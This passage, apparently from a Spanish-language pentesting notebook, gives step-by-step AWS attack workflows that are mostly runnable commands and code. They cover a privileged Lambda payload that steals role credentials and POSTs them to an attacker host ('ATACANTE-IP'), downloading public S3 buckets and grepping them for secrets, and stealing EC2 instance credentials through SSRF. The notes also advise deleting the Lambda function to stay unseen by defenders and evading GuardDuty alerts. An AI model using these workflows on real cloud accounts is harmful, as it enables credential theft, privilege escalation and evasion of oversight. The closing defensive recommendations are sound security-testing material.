>   --query 'Roles[?contains(AssumeRolePolicyDocument.Statement[0].Principal.Service, `lambda.amazonaws.com`)].[RoleName,Arn]' \
>   --output table
> ```
> 
> `--query` — Filtra roles cuya trust policy incluye `lambda.amazonaws.com` como principal de confianza, es decir, roles que Lambda puede asumir. De esta lista, seleccionar el rol con más privilegios.

**Paso 2 — Crear el payload Lambda para exfiltrar credenciales del rol**

```python
# payload.py — A comprimir en payload.zip
import boto3
import urllib.request
import json

def lambda_handler(event, context):
    sts = boto3.client('sts')
    identity = sts.get_caller_identity()
    
    # Obtener credenciales temporales del rol de la función
    creds = boto3.session.Session().get_credentials().get_frozen_credentials()
    
    result = {
        "identity": identity,
        "access_key": creds.access_key,
        "secret_key": creds.secret_key,
        "token": creds.token
    }
    
    # Exfiltrar a servidor del atacante
    data = json.dumps(result).encode()
    req = urllib.request.Request("http://ATACANTE-IP:8080", data=data, method="POST")
    urllib.request.urlopen(req, timeout=5)
    
    return result
```

```bash
zip payload.zip payload.py
```

**Paso 3 — Crear y ejecutar la función Lambda con el rol privilegiado**

> [!tip] Crear la función Lambda con el rol de mayor privilegio
> 
> ```bash
> aws lambda create-function \
>   --function-name privesc-exfil \
>   --runtime python3.12 \
>   --role "arn:aws:iam::123456789012:role/AdminLambdaRole" \
>   --handler payload.lambda_handler \
>   --zip-file fileb://payload.zip \
>   --timeout 30
> ```
> 
> `--role` — ARN del rol privilegiado identificado en el Paso 1. La función se ejecutará con los permisos de ese rol. `--timeout 30` — 30 segundos de timeout para que haya tiempo de exfiltrar las credenciales.

> [!tip] Invocar la función para obtener las credenciales del rol privilegiado
> 
> ```bash
> aws lambda invoke \
>   --function-name privesc-exfil \
>   --payload '{}' \
>   output.json && cat output.json
> ```
> 
> La función devuelve las credenciales temporales del rol privilegiado. Cargarlas con `export` y operar con los nuevos permisos.

> [!important] Limpieza post-escalada en Lambda La función Lambda creada queda registrada en la cuenta y es visible para el equipo de seguridad. Eliminarla tras obtener las credenciales: `aws lambda delete-function --function-name privesc-exfil`. También considerar que la invocación queda registrada en CloudTrail y los logs en CloudWatch.

### Flujo 3 — Explotación de bucket S3 público

**Paso 1 — Verificar acceso público sin credenciales**

> [!tip] Comprobar acceso anónimo al bucket
> 
> ```bash
> aws s3 ls s3://target-bucket-name/ --no-sign-request
> ```
> 
> Si lista contenido, el bucket es públicamente legible. Si da error `AccessDenied`, no es público. Si da `NoSuchBucket`, el nombre es incorrecto o el bucket no existe.

**Paso 2 — Explorar y descargar contenido sensible**

> [!tip] Sincronizar todo el contenido del bucket público
> 
> ```bash
> aws s3 sync s3://target-bucket-name/ ./target-bucket/ --no-sign-request
> grep -r -i "password\|secret\|key\|token\|credential" ./target-bucket/
> ```
> 
> `sync` — Descarga todo el contenido al directorio local. `grep` — Búsqueda de credenciales en todos los ficheros descargados.

**Paso 3 — Comprobar si hay escritura anónima**

> [!tip] Test de escritura en bucket público
> 
> ```bash
> echo "pentest-write-check-$(date +%s)" > /tmp/write-check.txt
> aws s3 cp /tmp/write-check.txt \
>   s3://target-bucket-name/pentest-BORRAR-write-check.txt \
>   --no-sign-request
> ```
> 
> Si tiene éxito, el bucket permite escritura anónima. Esto permite sobrescribir ficheros existentes (web defacement si es un hosting estático), subir malware o inyectar código en ficheros JavaScript/HTML. Documentar inmediatamente y avisar al cliente: escritura pública sin control en un bucket es un hallazgo **Critical**.

### Flujo 4 — Extracción de credenciales desde IMDS (post-SSRF)

Cuando se explota un SSRF en una aplicación web corriendo en EC2 que apunta al IMDS.

**Paso 1 — Obtener el nombre del rol de la instancia**

```bash
# Desde SSRF:
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Respuesta: NombreDelRol
```

**Paso 2 — Obtener las credenciales temporales del rol**

```bash
# Desde SSRF:
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/NombreDelRol
# Respuesta JSON con AccessKeyId, SecretAccessKey, Token, Expiration
```

**Paso 3 — Cargar las credenciales en la CLI del atacante**

> [!tip] Usar las credenciales IMDS desde la máquina del atacante
> 
> ```bash
> export AWS_ACCESS_KEY_ID="ASIAIOSFODNN7EXAMPLE"
> export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG..."
> export AWS_SESSION_TOKEN="AQoDYXdzEJr..."
> aws sts get-caller-identity
> ```
> 
> Las credenciales temporales del rol de la instancia son completamente funcionales desde cualquier máquina. Cargarlas como variables de entorno y operar con los permisos del rol de EC2.

> [!important] GuardDuty detecta exfiltración de credenciales IMDS GuardDuty tiene una detección específica: `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.InsideAWS` y `...OutsideAWS` que alerta cuando las credenciales de un rol EC2 se usan desde una IP diferente a la de la instancia. En entornos con GuardDuty, usar las credenciales directamente desde la instancia comprometida (no exfiltrarlas) o usar técnicas de bypass documentadas en hackingthe.cloud.

## 🔗 Relaciones / Contexto

El cloud pentesting con AWS CLI es fundamentalmente distinto al pentesting tradicional: no se buscan CVEs del kernel ni servicios mal configurados a nivel de red, sino **rutas de permisos**. La pregunta no es "¿qué puerto está abierto?", sino "¿qué permisos tiene este principal y cómo llegar desde aquí a `AdministratorAccess`?". Las herramientas complementarias más importantes son **Pacu** (framework de explotación AWS, equivalente a Metasploit para cloud), **ScoutSuite** y **Prowler** (auditoría de configuración), **enumerate-iam** (enumeración de permisos por fuerza bruta sin generar errores en CloudTrail) y **CloudFox** (inventario y búsqueda de vectores de ataque).

En el informe de pentest, los hallazgos AWS se priorizan así: bucket S3 público con datos sensibles → **Critical**; escalada de privilegios via IAM PassRole → **Critical**; credenciales en código fuente de Lambda o User Data → **Critical**; IMDSv1 habilitado (vulnerable a SSRF sin mitigación) → **High**; usuarios IAM sin MFA con Access Keys → **High**; CloudTrail deshabilitado → **High**; snapshots EBS públicos → **High**; permisos con wildcard (`*`) excesivos → **Medium** a **High** según el alcance. La recomendación defensiva central es implementar el principio de least privilege en todos los roles y usuarios IAM, habilitar CloudTrail en todas las regiones, activar GuardDuty, migrar a IMDSv2 forzado, y usar herramientas de auditoría continua como AWS Config y Security Hub.
